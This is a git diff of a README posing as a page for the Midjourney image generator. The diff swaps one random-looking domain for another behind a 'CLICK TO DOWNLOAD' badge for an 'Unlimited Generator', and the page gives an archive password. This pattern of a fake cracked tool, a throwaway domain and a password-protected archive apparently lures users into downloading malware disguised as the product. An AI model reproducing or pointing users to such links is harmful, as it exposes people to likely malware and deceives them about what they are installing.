@@ -1,6 +1,6 @@
 # Midjourney
 
-[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://efhiwogvjd.com/Midjourney-Unlimited-Generator)
+[![CLICK TO DOWNLOAD](https://img.shields.io/badge/CLICK%20TO%20DOWNLOAD-008C3A?style=for-the-badge&logo=github&logoColor=white)](https://fghtfghjfdjfdj.com/Midjourney-Unlimited-Generator)
 > #### Archive password: `2026`
 
 AI-powered image and video generation service that creates high-quality visuals from text prompts via web and Discord.
